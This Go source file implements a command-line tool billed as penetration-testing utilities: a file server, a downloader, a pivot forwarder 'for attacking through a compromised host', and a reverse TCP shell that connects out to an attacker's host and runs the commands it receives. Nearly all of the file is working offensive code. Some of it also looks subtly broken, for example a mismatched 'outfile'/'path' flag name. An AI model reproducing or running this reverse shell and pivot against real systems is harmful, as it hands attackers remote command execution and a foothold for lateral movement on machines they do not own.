package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"bufio"
	"os/exec"
	"strings"
	"runtime"

	"github.com/thatisuday/commando"
)

func check(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func server(args map[string]commando.ArgValue, flags map[string]commando.FlagValue) {
	dir, err := flags["dir"].GetString()
	check(err)

	port, err := flags["port"].GetString()
	check(err)

	fmt.Printf("Starting server for directory %s on port %s\n\n", dir, port)
	fs := http.FileServer(http.Dir(dir))
	fmt.Println(http.ListenAndServe(":"+port, fs))

}

func download(args map[string]commando.ArgValue, flags map[string]commando.FlagValue) {
	url := args["url"].Value

	outfile, err := flags["outfile"].GetString()
	check(err)

	// Send the request
	resp, err := http.Get(url)
	check(err)
	defer resp.Body.Close()

	// Make the file
	out, err := os.Create(outfile)
	check(err)
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	check(err)
}

func pivot(args map[string]commando.ArgValue, flags map[string]commando.FlagValue) {
	targetAddress := args["target"].Value
	port := args["port"].Value
	protocol, err := flags["protocol"].GetString()
	check(err)

	// Start Server
	incoming, err := net.Listen(protocol, fmt.Sprintf(":%s", port))
	fmt.Println("done with listen")
	check(err)
	fmt.Printf("server running %s\n", port)

	// Accept Connection
	for {
		client, err := incoming.Accept()
		check(err)
		go handleRequest(client, targetAddress, protocol)

	}
}

func initiateShellConnection(args map[string]commando.ArgValue) (net.Conn, error) {
	// Establish Connection
	targetAddress := args["rhost"].Value
	targetPort := args["rport"].Value
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", targetAddress, targetPort))
	check(err)
	if err == nil {
		fmt.Printf("Connection established with %s\n", targetAddress)
	}
	return conn, err
}

func createShell(conn net.Conn) func(string){
	// Actually executes the command (with a special case for Windows)
	execCommand := func(osString string, args []string) *exec.Cmd{
		switch osString {
		case "windows":
			// Unfortunately, most Windows commands are shell builtins rather than exe's
			// so we have to get OS specific. :(
			args = append([]string{"/c"}, args...) // prepend
			return exec.Command("cmd", args...)
		default:
			return exec.Command(args[0], args[1:]...)
		}
	}

	// Handles builtin shell commands like cd and exit
	handleBuiltins := func(cmd string, args []string) bool {
		switch args[0] {
		case "cd":
		    // 'cd' to home dir with empty path not yet supported.
		    if len(args) < 2 {
		    	conn.Write([]byte("path required\n"))
		        return true
		    }
		    // Change the directory and return the error.
		    err := os.Chdir(args[1])
		    check(err)
		    if err != nil {
		    	conn.Write([]byte(err.Error() + "\n"))
		    }
		    return true
		case "exit":
		    os.Exit(0)
		}
		return false
	}

	// Shell handler function
	handleCommand := func(cmd string) {
		args := strings.Fields(cmd)

		if handleBuiltins(cmd, args) {
			return
		}

		command := execCommand(runtime.GOOS, args)
		command.Stderr = conn
	 	command.Stdout = conn
	 	err := command.Run()
	 	check(err)
	 	if err != nil {
	  		fmt.Fprintln(conn, err)
	 	}
		
	}

	return handleCommand
}

func getShellPrompt() string {
		prompt := " >"

		currentWorkingDirectory, err := os.Getwd()
		check(err)
	    if err != nil {
	        log.Fatal(err)
	    }

		if len(currentWorkingDirectory) > 0 {
			prompt = currentWorkingDirectory + prompt
		}

		return prompt
}

func shell(args map[string]commando.ArgValue, flags map[string]commando.FlagValue) {
	// Initiate Connection
	conn, err := initiateShellConnection(args)
	check(err)
	defer conn.Close()

	// Create Shell
	shell := createShell(conn)

	// Shell loop
	for {
		// Print prompt
		prompt := getShellPrompt()
		fmt.Fprintf(conn, "%s ", prompt)

		// Read input from user
		remoteCmd, err := bufio.NewReader(conn).ReadString('\n')
		check(err)
		if err != nil {
            return
        }

        // Execute
		if newCmd := strings.TrimSuffix(remoteCmd, "\n"); len(newCmd) > 0 {
			shell(newCmd)
		}
	}
}

func handleRequest(client net.Conn, targetAddress string, protocol string) {
	fmt.Printf("client '%v' connected!\n", client.RemoteAddr())

	// Dial out to the target

	target, err := net.Dial(protocol, targetAddress)
	check(err)
	fmt.Printf("connection established to %v\n", target.RemoteAddr())
	go CopyIO(client, target)
	go CopyIO(target, client)
}

func CopyIO(src, dest net.Conn) {
	defer src.Close()
	defer dest.Close()
	io.Copy(src, dest)
}

func main() {

	wd, err := os.Getwd()
	check(err)

	name, err := os.Executable()
	check(err)

	commando.
		SetExecutableName(name).
		SetVersion("0.0.1").
		SetDescription("This tool provides utilities to facilitate penetration testing on multiple architectures.")

	// File server
	commando.
		Register("server").
		SetShortDescription("starts a server").
		SetDescription("This command starts a server with the specified options.").
		AddFlag("dir,d", "directory to serve", commando.String, wd).
		AddFlag("port,p", "port to serve on", commando.String, "8080").
		SetAction(server)

	// Download file command
	commando.
		Register("download").
		SetShortDescription("downloads a file from a URL").
		SetDescription("This command downloads the file at a provided URL").
		AddArgument("url", "target URL", "").
		AddFlag("path,p", "output file", commando.String, wd+"/outfile").
		SetAction(download)

	//Pivot command
	commando.
		Register("pivot").
		SetShortDescription("sets up a forwarding service").
		SetDescription("Sets up a forwarding service for attacking through a compromised host").
		AddArgument("target", "target (<host>:<port>)", "").
		AddArgument("port", "port", "").
		AddFlag("protocol,p", "protocol, defaults to tcp", commando.String, "tcp").
		SetAction(pivot)

	commando.
		Register("shell").
		SetShortDescription("creates a reverse TCP shell").
		SetDescription("This command sends a reverse TCP shell to a given host and port").
		AddArgument("rhost", "IP address of the attacker's host (e.g. 192.168.0.1)", "").
		AddArgument("rport", "TCP port listening on the attacker host (default: 1234)", "1234").
		AddArgument("lport", "TCP port to send from (default: 22)", "22").
		SetAction(shell)

	commando.Parse(nil)

}